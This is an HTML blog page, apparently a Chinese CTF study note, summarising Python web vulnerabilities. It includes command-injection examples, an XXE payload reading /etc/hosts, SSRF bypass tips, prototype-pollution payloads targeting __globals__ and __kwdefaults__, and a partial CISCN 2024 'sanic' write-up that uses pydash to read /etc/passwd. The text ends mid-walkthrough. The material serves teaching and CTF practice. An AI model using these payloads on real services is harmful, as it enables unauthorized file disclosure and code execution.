@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+    <link rel="stylesheet" href="https://unpkg.com/@highlightjs/cdn-assets@11.6.0/styles/vs2015.min.css">
+    <script src="https://fastly.jsdelivr.net/gh/stevenjoezhang/live2d-widget@latest/autoload.js"></script>
+    <script src="https://unpkg.com/@highlightjs/cdn-assets@11.6.0/highlight.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/highlightjs-line-numbers.js/dist/highlightjs-line-numbers.min.js"></script>
+    <script>
+        hljs.initHighlightingOnLoad();
+        hljs.initLineNumbersOnLoad();
+    </script>
+    
+    <title>Python漏洞总结 - 24k的小站</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="RCE XSS XXE CSRF SSRF SSTI 原型链构造 文件操作 反序列化  RCE（远程代码执行） 常见的命令执行模块及函数：  os subprocess pty codecs popen eval exec  常见 Python RCE 情况 ip&#x3D;input() os.system(f&#39;ping -c 4 &amp;#123;ip&amp;#125;&#39;) a&#x3D;__import__(&#39;os&#39;).">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Python漏洞总结">
+<meta property="og:url" content="https://24kblog.top/posts/1724511731/index.html">
+<meta property="og:site_name" content="24k的小站">
+<meta property="og:description" content="RCE XSS XXE CSRF SSRF SSTI 原型链构造 文件操作 反序列化  RCE（远程代码执行） 常见的命令执行模块及函数：  os subprocess pty codecs popen eval exec  常见 Python RCE 情况 ip&#x3D;input() os.system(f&#39;ping -c 4 &amp;#123;ip&amp;#125;&#39;) a&#x3D;__import__(&#39;os&#39;).">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=R2RnS2RZZ0tvSDhzdWlEUGIyR3N1My9NMHc5eXBxTmdRcmM9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=MVQ5T0NqYmN4TnpiSm40ZWJtSU14WC9NMHc5eXBxTmdRcmM9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=M3EwYXVuTVdhWExwN1JVNUF2MG5VWC9NMHc5eXBxTmdRcmM9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=bStIcEIwWUwzMDlJaFF5N0lZazdUSC9NMHc5eXBxTmdRcmM9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=ZVltOVlwR21mZi9VaGNwRnhoMVZVaXpBbnJMdG85Q1kwSVk9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=ZllnNXpHUy8zK1QzSjdiWDNiUG5RaXpBbnJMdG85Q1kwSVk9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=MytzT2lKZnAzdXBuMkJ4d1lpUXNDQ3pBbnJMdG85Q1kwSVk9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=eDNnZkRjenpxWU5sQ3ZyMEp4ZSsvdE9uZUxJNGZoZGlzbEU9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=L2VkdzR1bHl2YVppRXYvLzVXUWZZOU9uZUxJNGZoZGlzbEU9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=bmdRL3l1dDhCQThaWnJTUmpVRU5iZE9uZUxJNGZoZGlzbEU9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=Vy8yVXozTmRJaW05cmovWG10QlgyZWFFbXFLWHkvSDdpdkE9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=dkVMUm1WRzhDWUM4WDNydTFVd29JK2FFbXFLWHkvSDdpdkE9">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=eVJ1b3lLTmNIM2tEZkJZeGkwV1IvcHVERmFiWEs1OUtxM2dJ">
+<meta property="og:image" content="https://img.24kblog.top/app/hide.php?key=cEN5Y0R5L1dFWXZVRTJLM3FEMW0vT2FFbXFLWHkvSDdpdkE9">
+<meta property="article:published_time" content="2025-04-12T05:47:31.000Z">
+<meta property="article:modified_time" content="2025-04-12T05:53:44.194Z">
+<meta property="article:author" content="24kcsplus">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="网安">
+<meta property="article:tag" content="笔记">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.24kblog.top/app/hide.php?key=R2RnS2RZZ0tvSDhzdWlEUGIyR3N1My9NMHc5eXBxTmdRcmM9">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/justifiedGallery/justifiedGallery.min.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1744437293676">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1744437293676">
+    
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="24k的小站" type="application/atom+xml">
+</head>
+
+<body class="mdui-drawer-body-left">
+    
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://gcore.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="24kcsplus" class="mdui-btn mdui-btn-icon"><img src="https://gcore.jsdelivr.net/gh/24kcsplus/home_files@latest/avatar.png" alt="24kcsplus"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="24kcsplus">
+            <img src="https://gcore.jsdelivr.net/gh/24kcsplus/home_files@latest/avatar.png" alt="24kcsplus" alt="24kcsplus">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>18</div>
+        <div><span>标签</span>26</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archives.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博客">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博客
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://net.24kblog.top" title="DN42">
+            <i class="mdui-list-item-icon nexmoefont icon-dribbble"></i>
+            <div class="mdui-list-item-content">
+                DN42
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://qd.24kblog.top" title="贴吧云签到">
+            <i class="mdui-list-item-icon nexmoefont icon-appstore-fill"></i>
+            <div class="mdui-list-item-content">
+                贴吧云签到
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://gaokao.24kblog.top" title="高考倒计时">
+            <i class="mdui-list-item-icon nexmoefont icon-calendar-fill"></i>
+            <div class="mdui-list-item-content">
+                高考倒计时
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+        
+            <form id="search_form">
+                <label><input class="st-default-search-input" id="search_value" name="q" type="search" placeholder="搜索" style="
+                    font-size: 15px !important;
+                    height: 56px !important;
+                    background-image: none;
+                "></label>
+            </form>
+         
+    </div>
+</div>
+    
+    <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-social">
+        <a class="mdui-ripple" href="https://space.bilibili.com/225319411" target="_blank" mdui-tooltip="{content: '哔哩哔哩'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
+            <i class="nexmoefont icon-bilibili"></i>
+        </a><a class="mdui-ripple" href="https://github.com/24kcsplus/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
+            <i class="nexmoefont icon-github"></i>
+        </a><a class="mdui-ripple" href="https://twitter.com/24k_ghost_acc" target="_blank" mdui-tooltip="{content: 'Twitter'}" style="color: rgb(59, 151, 239);background-color: rgba(59, 151, 239, .1);">
+            <i class="nexmoefont icon-twitter"></i>
+        </a>
+    </div>
+</div>
+    
+    
+
+    
+    
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/CSP/" style="font-size: 10px;">CSP</a> <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Node-js/" style="font-size: 10px;">Node.js</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/QQ%E6%9C%BA%E5%99%A8%E4%BA%BA/" style="font-size: 10px;">QQ机器人</a> <a href="/tags/QQ%E9%A2%91%E9%81%93/" style="font-size: 10px;">QQ频道</a> <a href="/tags/RCE/" style="font-size: 10px;">RCE</a> <a href="/tags/hexo/" style="font-size: 10px;">hexo</a> <a href="/tags/js/" style="font-size: 10px;">js</a> <a href="/tags/npm/" style="font-size: 10px;">npm</a> <a href="/tags/%E4%BF%A1%E5%AE%89/" style="font-size: 10px;">信安</a> <a href="/tags/%E5%88%9D%E8%A7%81/" style="font-size: 10px;">初见</a> <a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 10px;">博客</a> <a href="/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" style="font-size: 10px;">原型链污染</a> <a href="/tags/%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9/" style="font-size: 13.33px;">哔哩哔哩</a> <a href="/tags/%E5%93%94%E5%93%A9%E6%BC%AB%E6%B8%B8/" style="font-size: 10px;">哔哩漫游</a> <a href="/tags/%E6%8A%80%E6%9C%AF/" style="font-size: 10px;">技术</a> <a href="/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/" style="font-size: 10px;">服务器</a> <a href="/tags/%E6%AF%8F%E6%97%A5%E6%92%AD%E6%8A%A5/" style="font-size: 13.33px;">每日播报</a> <a href="/tags/%E6%B1%87%E7%BC%96/" style="font-size: 10px;">汇编</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 10px;">渗透</a> <a href="/tags/%E7%95%AA%E5%89%A7/" style="font-size: 10px;">番剧</a> <a href="/tags/%E7%AC%94%E8%AE%B0/" style="font-size: 20px;">笔记</a> <a href="/tags/%E7%BD%91%E5%AE%89/" style="font-size: 16.67px;">网安</a> <a href="/tags/%E8%80%83%E8%AF%95/" style="font-size: 10px;">考试</a> <a href="/tags/%E9%80%86%E5%90%91/" style="font-size: 13.33px;">逆向</a>
+    </div>
+    
+  </div>
+
+    
+    <!-- 一言 -->
+
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">
+      一言
+    </h3>
+    <div class="nexmoe-widget">
+      <ul class="hitokoto-box">
+        <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="a">
+          <a href="#" id="hitokoto_text">
+            
+          </a>
+          <a href="#" id="hitokoto_error_text" style="display: none;">
+            
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+
+  <script>
+    let hitokotoText = document.getElementById('hitokoto_text')
+    let hitokotoErroText = document.getElementById('hitokoto_error_text')
+    let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+    window.onload = function () {
+      let url = 'https://v1.hitokoto.cn'
+      if (hitokotoCategory) {
+        url += '?c=' + hitokotoCategory
+      }
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+          hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+        })
+        .catch((reason) => {
+          console.error(11, reason)
+          hitokotoText.style.display = 'none'
+          hitokotoErroText.style.display = 'block'
+        })
+    }
+  </script>
+  
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2025 24kcsplus <br />
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+         <br /><a href="https://icp.gov.moe/?keyword=20241969" target="_blank">萌ICP备20241969号</a> <br /><a href="https://beian.miit.gov.cn/" target="_blank">琼ICP备2022012208号</a> <br /><a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=46010602001577"><img src="https://gcore.jsdelivr.net/gh/24kcsplus/home_files@latest/beian.png" style="float:left;width:12px;height:12px"/>琼公网安备46010602001577号</a> <!--<br /><a target="_blank" rel="noopener" href="https://cdnnb.cn" class="active"><img style="float:right" src="https://img.shields.io/badge/本站由失控的防御系统提供加速防御支持-green"></a>-->
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+      
+          <div class="nexmoe-post-cover" style="padding-bottom: 66.66666666666666%;"> 
+              <img data-fancybox="gallery" src="https://gcore.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/cover/5c3aec85a4343.jpg" alt="Python漏洞总结" loading="lazy">
+              <h1>Python漏洞总结</h1>
+          </div>
+      
+      
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    <a><i class="nexmoefont icon-calendar-fill"></i>2025年04月12日</a>
+</div>
+
+      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
+    
+        <a><i class="nexmoefont icon-areachart"></i>约2.2k字</a>
+        <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要10分钟</a>
+    
+</div>
+
+      <ul>
+<li>RCE</li>
+<li>XSS</li>
+<li>XXE</li>
+<li>CSRF</li>
+<li>SSRF</li>
+<li>SSTI</li>
+<li>原型链构造</li>
+<li>文件操作</li>
+<li>反序列化</li>
+</ul>
+<h2 id="RCE（远程代码执行）">RCE（远程代码执行）</h2>
+<p>常见的命令执行模块及函数：</p>
+<ul>
+<li>os</li>
+<li>subprocess</li>
+<li>pty</li>
+<li>codecs</li>
+<li>popen</li>
+<li>eval</li>
+<li>exec</li>
+</ul>
+<p>常见 Python RCE 情况</p>
+<pre><code class="language-python">ip=input()
+os.system(f'ping -c 4 &#123;ip&#125;')
+a=__import__('os').system('ls -a') #动态调用实现
+</code></pre>
+<p>或者</p>
+<pre><code class="language-python">a=input()
+b=subprocess.Popen(f'ping -c 4 &#123;a&#125;',shell=True)
+</code></pre>
+<h2 id="XSS（跨站脚本攻击）">XSS（跨站脚本攻击）</h2>
+<p>Coming s∞n</p>
+<h2 id="XXE（XML外部实体注入）">XXE（XML外部实体注入）</h2>
+<p>感觉有点像反序列化，解析数据时通过操作数据可使其自动执行一些代码</p>
+<p>Python 中解析 XML 的几种方法：</p>
+<ul>
+<li>xml.sax.parse()</li>
+<li>xml.dom.minidom.parse()</li>
+<li>xml.dom.pulldom.parse()</li>
+<li>xml.etree.ElementTree()</li>
+<li>一些第三方库，例如 <code>lxml</code></li>
+</ul>
+<p>靶机：<a target="_blank" rel="noopener" href="https://github.com/hannoch/python-xxe">https://github.com/hannoch/python-xxe</a></p>
+<p>注意：此靶机需要手动允许外部实体，因为现在 etree 已默认禁用外部实体引入</p>
+<p>靶机 payload:</p>
+<pre><code class="language-xml">
+&lt;!DOCTYPE a[
+	&lt;!ENTITY xxe SYSTEM &quot;file///etc/hosts&quot;&gt;
+]&gt;
+
+&lt;user&gt;
+	&lt;username&gt;
+		&amp;xxe;
+	&lt;/username&gt;
+	&lt;password&gt;
+		password
+	&lt;/password&gt;
+&lt;/user&gt;
+
+</code></pre>
+<h2 id="CSRF（跨站请求伪造）">CSRF（跨站请求伪造）</h2>
+<p>Coming s∞n</p>
+<h2 id="SSRF（服务端请求伪造）">SSRF（服务端请求伪造）</h2>
+<p>常用的可造成 SSRF 漏洞的请求库：</p>
+<ul>
+<li>requests</li>
+<li>pycurl</li>
+</ul>
+<p>通常 CTF 会过滤非 HTTP/HTTPS 协议，私有地址</p>
+<p>进行攻击时通常要考虑如何绕过，比如：</p>
+<ul>
+<li>私有地址除了127.0.0.1，也包括整个127.0.0.0/8</li>
+<li>可以使用重绑定绕过，将自己的域名解析为私有地址</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#%5B%E7%AC%AC%E4%B8%89%E7%AB%A0%20web%E8%BF%9B%E9%98%B6%5DPython%E9%87%8C%E7%9A%84SSRF">BUUCTF - Python里的SSRF</a></p>
+<h2 id="SSTI（模板注入）">SSTI（模板注入）</h2>
+<p>Coming s∞n</p>
+<h2 id="Python-原型链污染">Python 原型链污染</h2>
+<p>整个原型链污染主要就是依靠以下函数</p>
+<pre><code class="language-python">def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+</code></pre>
+<p>这函数什么意思呢？</p>
+<p>用一个<a target="_blank" rel="noopener" href="https://tttang.com/archive/1876/#toc__1:~:text=%E7%BD%AE%E5%B1%9E%E6%80%A7%E7%AD%89-,%E5%85%88%E4%BB%A5%E8%87%AA%E5%AE%9A%E4%B9%89%E5%B1%9E%E6%80%A7%E4%B8%BA%E4%BE%8B%E5%AD%90,-%EF%BC%9A">示例</a>加 <a target="_blank" rel="noopener" href="https://chat.qwen.ai/s/07da341e-01cc-4e93-8db0-93ca2ac7a084">AI sama 的解释</a>就可以知道了</p>
+<pre><code class="language-python">class father:
+    secret = &quot;haha&quot;
+
+class son_a(father):
+    pass
+
+class son_b(father):
+    pass
+
+def merge(src, dst):
+    # Recursive merge function
+    for k, v in src.items():
+        if hasattr(dst, '__getitem__'):
+            if dst.get(k) and type(v) == dict:
+                merge(v, dst.get(k))
+            else:
+                dst[k] = v
+        elif hasattr(dst, k) and type(v) == dict:
+            merge(v, getattr(dst, k))
+        else:
+            setattr(dst, k, v)
+
+instance = son_b()
+payload = &#123;
+    &quot;__class__&quot; : &#123;
+        &quot;__base__&quot; : &#123;
+            &quot;secret&quot; : &quot;no way&quot;
+        &#125;
+    &#125;
+&#125;
+
+print(son_a.secret)
+#haha
+print(instance.secret)
+#haha
+merge(payload, instance)
+print(son_a.secret)
+#no way
+print(instance.secret)
+#no way
+</code></pre>
+<h3 id="执行过程详解"><strong>执行过程详解</strong></h3>
+<h4 id="初始状态"><strong>初始状态</strong></h4>
+<ul>
+<li><code>son_a</code> 和 <code>son_b</code> 的 <code>secret</code> 属性继承自 <code>father</code>，初始值为 <code>&quot;haha&quot;</code>。</li>
+</ul>
+<h4 id="合并步骤"><strong>合并步骤</strong></h4>
+<ol>
+<li>
+<p><strong>处理 <code>payload[&quot;__class__&quot;]</code></strong>：</p>
+<ul>
+<li><code>src</code> 是 <code>payload</code>，<code>dst</code> 是 <code>instance</code>。</li>
+<li><code>k = &quot;__class__&quot;</code>，<code>v = &#123;&quot;__base__&quot;: ...&#125;</code>。</li>
+<li><code>instance</code> 没有 <code>__getitem__</code>，但 <code>hasattr(instance, &quot;__class__&quot;)</code> 为 <code>True</code>（实例的 <code>__class__</code> 属性指向 <code>son_b</code> 类）。</li>
+<li>进入 <code>merge(v, getattr(instance, &quot;__class__&quot;)</code>，即合并到 <code>son_b</code> 类。</li>
+</ul>
+</li>
+<li>
+<p><strong>处理 <code>son_b</code> 类的 <code>__base__</code> 属性</strong>：</p>
+<ul>
+<li><code>src</code> 是 <code>&#123;&quot;__base__&quot;: &#123;&quot;secret&quot;: &quot;no way&quot;&#125;&#125;</code>，<code>dst</code> 是 <code>son_b</code> 类。</li>
+<li><code>k = &quot;__base__&quot;</code>，<code>v = &#123;&quot;secret&quot;: &quot;no way&quot;&#125;</code>。</li>
+<li><code>son_b</code> 的 <code>__base__</code> 属性指向 <code>father</code> 类。</li>
+<li>进入 <code>merge(v, father)</code>，即合并到 <code>father</code> 类。</li>
+</ul>
+</li>
+<li>
+<p><strong>修改 <code>father</code> 类的 <code>secret</code> 属性</strong>：</p>
+<ul>
+<li><code>src</code> 是 <code>&#123;&quot;secret&quot;: &quot;no way&quot;&#125;</code>，<code>dst</code> 是 <code>father</code> 类。</li>
+<li><code>k = &quot;secret&quot;</code>，<code>v = &quot;no way&quot;</code>。</li>
+<li>直接通过 <code>setattr(father, &quot;secret&quot;, &quot;no way&quot;)</code> 覆盖父类的 <code>secret</code> 属性。</li>
+</ul>
+</li>
+</ol>
+<p>通过 <code>merge</code> 函数，我们可以构造一个字典，然后改变类的属性等等</p>
+<p>但以上示例貌似只能对有继承关系的类进行改动，诶，其实还有办法</p>
+<p>类都有一个 <code>__init__</code> 方法，而函数或类的方法都具有一个叫 <code>__global__</code> 的属性，这个属性能够将函数或类方法所申明的变量空间中的全局变量以字典的形式返回</p>
+<p>然后我们就可以构造类似以下的 payload:</p>
+<pre><code class="language-json">&#123;
+    &quot;__init__&quot; : &#123;
+        &quot;__globals__&quot; : &#123;
+            &quot;secret_var&quot; : 114514,
+            &quot;a&quot; : &#123;
+                &quot;secret_class_var&quot; : &quot;Pooooluted ~&quot;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>这样就可以修改无继承关系的类属性乃至全局变量</p>
+<p>除了全局变量，还可以修改引入的其它模块的种种内容</p>
+<pre><code class="language-json">&#123;
+    &quot;__init__&quot; : &#123;
+        &quot;__globals__&quot; : &#123;
+            &quot;test_1&quot; : &#123;
+                &quot;secret_var&quot; : 514,
+                &quot;target_class&quot; : &#123;
+                    &quot;secret_class_var&quot; : &quot;Poluuuuuuted ~&quot;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>以上示例就是将 test_1.py 里的变量和类改变了</p>
+<p>除了变量和类，我们还可以更改函数的形参默认值，这主要就是修改了函数 <code>__defaults__</code> 和 <code>__kwdefaults__</code> 这两个内置属性</p>
+<p>例如一个函数长这样：</p>
+<pre><code class="language-python">def evilFunc(arg_1 , * , shell = False):
+    if not shell:
+        print(arg_1)
+    else:
+        print(__import__(&quot;os&quot;).popen(arg_1).read())
+</code></pre>
+<p>我们就可以构造以下的 payload：</p>
+<pre><code class="language-json">&#123;
+    &quot;__init__&quot; : &#123;
+        &quot;__globals__&quot; : &#123;
+            &quot;evilFunc&quot; : &#123;
+                &quot;__kwdefaults__&quot; : &#123;
+                    &quot;shell&quot; : True
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>这样就可以修改 <code>evilFun</code> 函数形参 <code>shell</code> 的默认值了</p>
+<p>根据以上方法，我们可以修改一些库中重要的变量、类等等的内容，例如 <code>flask</code> 的 <code>SECRET_KEY</code> <code>_got_first_request</code> <code>_static_url_path</code> 等等，甚至是达到 RCE的效果</p>
+<p>但是以上种种都基于有 <code>merge</code> 方法的情况下，例如：<code>Pydash</code> 模块中的 <code>set_</code> 和 <code>set_with</code> 方法</p>
+<h3 id="例题-CISCN-2024-sanic">例题 <a target="_blank" rel="noopener" href="https://ctf.show/challenges#sanic-4328">CISCN 2024 - sanic</a></h3>
+<p>先访问 /src，获得源码</p>
+<pre><code class="language-python">from sanic import Sanic
+from sanic.response import text, html
+from sanic_session import Session
+import pydash
+# pydash==5.1.2
+
+
+class Pollute:
+    def __init__(self):
+        pass
+
+
+app = Sanic(__name__)
+app.static(&quot;/static/&quot;, &quot;./static/&quot;)
+Session(app)
+
+
+@app.route('/', methods=['GET', 'POST'])
+async def index(request):
+    return html(open('static/index.html').read())
+
+
+@app.route(&quot;/login&quot;)
+async def login(request):
+    user = request.cookies.get(&quot;user&quot;)
+    if user.lower() == 'adm;n':
+        request.ctx.session['admin'] = True
+        return text(&quot;login success&quot;)
+
+    return text(&quot;login fail&quot;)
+
+
+@app.route(&quot;/src&quot;)
+async def src(request):
+    return text(open(__file__).read())
+
+
+@app.route(&quot;/admin&quot;, methods=['GET', 'POST'])
+async def admin(request):
+    if request.ctx.session.get('admin') == True:
+        key = request.json['key']
+        value = request.json['value']
+        if key and value and type(key) is str and '_.' not in key:
+            pollute = Pollute()
+            pydash.set_(pollute, key, value)
+            return text(&quot;success&quot;)
+        else:
+            return text(&quot;forbidden&quot;)
+
+    return text(&quot;forbidden&quot;)
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+</code></pre>
+<p>然后访问 /login 并伪造 Cookie</p>
+<p>这里如果直接将 Cookie 设为 user=“adm;n” 会因分号被截断，所以要利用RFC2068的编码规则绕过，简单来说就是八进制编码</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=R2RnS2RZZ0tvSDhzdWlEUGIyR3N1My9NMHc5eXBxTmdRcmM9" alt="截图_选择区域_20250412051317.png" data-caption="截图_选择区域_20250412051317.png" loading="lazy"></p>
+<p>代码中可以看到，除了这个分号，还有 <code>_.</code> 也被过滤了</p>
+<p>查看 pydash 的源码可以发现它会将 <code>\\.</code> 变为 <code>.</code> ，然后匹配成组的 <code>\\</code> 和 <code>.</code> 来分割</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=MVQ5T0NqYmN4TnpiSm40ZWJtSU14WC9NMHc5eXBxTmdRcmM9" alt="截图_选择区域_20250412051414.png" data-caption="截图_选择区域_20250412051414.png" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=M3EwYXVuTVdhWExwN1JVNUF2MG5VWC9NMHc5eXBxTmdRcmM9" alt="截图_选择区域_20250412051359.png" data-caption="截图_选择区域_20250412051359.png" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=bStIcEIwWUwzMDlJaFF5N0lZazdUSC9NMHc5eXBxTmdRcmM9" alt="截图_选择区域_20250412051426.png" data-caption="截图_选择区域_20250412051426.png" loading="lazy"></p>
+<p>所以构造污染链时要注意这些规则</p>
+<p>初步构造 payload 如下：</p>
+<pre><code>&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;,&quot;value&quot;:&quot;/etc/passwd&quot;&#125;
+</code></pre>
+<p>(注：merge 方法的不同实现会让 payload 的形式各异，但中心思想都是一致的)</p>
+<p>这样可以访问任意文件了</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=ZVltOVlwR21mZi9VaGNwRnhoMVZVaXpBbnJMdG85Q1kwSVk9" alt="pre-wired-browser)_20250412051744.png" data-caption="pre-wired-browser)_20250412051744.png" loading="lazy"></p>
+<p>但是无法访问 /flag 文件，会显示500</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=ZllnNXpHUy8zK1QzSjdiWDNiUG5RaXpBbnJMdG85Q1kwSVk9" alt="pre-wired-browser)_20250412051854.png" data-caption="pre-wired-browser)_20250412051854.png" loading="lazy"></p>
+<p>所以要找找文件在哪</p>
+<p>分析app.static这个方法</p>
+<p>跟进源码发现一段注释</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=MytzT2lKZnAzdXBuMkJ4d1lpUXNDQ3pBbnJMdG85Q1kwSVk9" alt="截图_选择区域_20250412052137.png" data-caption="截图_选择区域_20250412052137.png" loading="lazy"></p>
+<p>大致意思就是 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录</p>
+<p>继续跟进两次就可以找到要污染的类 DirectoryHandler</p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=eDNnZkRjenpxWU5sQ3ZyMEp4ZSsvdE9uZUxJNGZoZGlzbEU9" alt="截图_选择区域_20250412052311.png" data-caption="截图_选择区域_20250412052311.png" loading="lazy"></p>
+<p><img data-fancybox="gallery" src="https://img.24kblog.top/app/hide.php?key=L2VkdzR1bHl2YVppRXYvLzVXUWZZOU9uZUxJNGZoZGlzbEU9" alt="截图_选择区域_20250412052326.png" data-caption="截图_选择区域_20250412052326.png" loading="lazy"></p>
+<p>只需要将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了</p>
+<p>查询资料可以发现，这个框架可以通过 <code>app.router.name_index['xxxxx']</code> 来获取注册的路由</p>
